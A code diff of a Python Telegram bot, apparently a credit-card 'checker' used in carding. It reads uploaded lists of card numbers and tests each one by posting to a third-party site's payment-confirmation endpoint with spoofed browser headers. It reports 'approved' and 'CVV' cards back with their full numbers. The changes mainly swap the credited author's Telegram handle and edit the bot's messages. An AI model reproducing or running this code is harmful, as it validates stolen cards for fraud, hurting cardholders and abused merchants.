@@ -41,7 +41,6 @@ def StripeChargebot(ccx):
 #import requests
 	time.sleep(3)
 #import requests
-
 	headers = {
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'Accept': 'application/json',
@@ -114,7 +113,7 @@ def StripeChargebot(ccx):
 }
 
 	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
-		print(req.json()['error'])
+	print(req.json()['error'])
 	if 'Retry later' in req.text:
 		ms = 'risk'
 		return ms
@@ -136,13 +135,11 @@ def StripeChargebot(ccx):
 			return req.json()
 @bot.message_handler(commands=["start"])
 def start(message):
-	bot.reply_to(message,'''ar Checker Welcome 
+	bot.reply_to(message,'''- Dar Checker Welcome 
 
 Telegram channels: @dar666787
 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe 
-Notice : Enjoy  Fast joine
-
-Checker Limited : 10 txt number
+Notice : Enjoy  Fast joine
 
 𝗜𝗻𝗳𝗼: Bot start 23oct
 𝐈𝐬𝐬𝐮𝐞𝐫: 
@@ -158,7 +155,7 @@ def main(message):
 	nop = 0
 	live = 0
 	ch = 0
-	ko = (bot.reply_to(message,"Please Wait Status Processing...⌛").message_id)
+	ko = (bot.reply_to(message,"Checking Starting.....🌿🌿").message_id)
 	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
 	with open("combo.txt", "wb") as w:
 		w.write(ee)
@@ -220,7 +217,7 @@ def main(message):
 				cm8 = types.InlineKeyboardButton(f"- Risk Wait ❌ -> {rsk} ", callback_data='x')
 				cm10 = types.InlineKeyboardButton(f"- Incorrect CC ❌ -> {nop} ", callback_data='x')
 				cm6 = types.InlineKeyboardButton(f"- All -> {total}/{cek}", callback_data='x')
-				mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6)
+				mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6)               
 				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Please Wait Checking Your Cards !.
 Programeer - @dar666787 🧸 ''', reply_markup=mes)
 				end_time = time.time()
@@ -228,7 +225,7 @@ Programeer - @dar666787 🧸 ''', reply_markup=mes)
 				msg = f'''
 <strong>- Hello Boss New Approved Card ✅
 --------------------------------------------
-- GateWay -> Stripe Charge 15 ViP ♕ .
+- GateWay -> Stripe Charge 15 ViP 🌿 .
 - Message -> {last}
 --------------------------------------------
 • Card •<code> {cc}</code>
@@ -242,11 +239,11 @@ Programeer - @dar666787 🧸 ''', reply_markup=mes)
 - Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
 - Process Date : <code>{t}</code>
 --------------------------------------------
-- Programmer • @Lx0b2</strong>'''
+- Bot Channels • @dar666787</strong>'''
 				msgcvc = f'''
 <strong>- Hello Boss New Cvv Card ✅
 --------------------------------------------
-- GateWay -> Stripe Charge 15 ViP ♕ .
+- GateWay -> Stripe Charge 15 ViP 🌿.
 - Message -> {last}
 --------------------------------------------
 • Card •<code> {cc}</code>
@@ -260,7 +257,7 @@ Programeer - @dar666787 🧸 ''', reply_markup=mes)
 - Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
 - Process Date : <code>{t}</code>
 --------------------------------------------
-- Programmer • @Lx0b2</strong>'''
+- Programmer • @dar666787</strong>'''
 				if 'Your card was declined.' in last:
 					dd += 1
 					cek+=1
@@ -298,7 +295,7 @@ Programeer - @dar666787 🧸 ''', reply_markup=mes)
 					msg1 = f'''
 <strong>- Hello Boss New Approved Charge Card ✅
 --------------------------------------------
-- GateWay -> Stripe Charge 15 ViP ♕ .
+- GateWay -> Stripe Charge 15 ViP 🌿  .
 - Message -> {last}
 --------------------------------------------
 • Card •<code> {cc}</code>
@@ -312,10 +309,12 @@ Programeer - @dar666787 🧸 ''', reply_markup=mes)
 - Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
 - Process Date : <code>{t}</code>
 --------------------------------------------
-- Programmer • @Lx0b2</strong>'''
+- Bot 🌿🌿 Channels • @dar666787</strong>'''
 					bot.reply_to(message, msg1)
 					time.sleep(15)
 	except Exception as eo:
 		print(eo)
-print("تم تشغيل البوت")
+		
+		
+print("Bot Start")
 bot.polling()
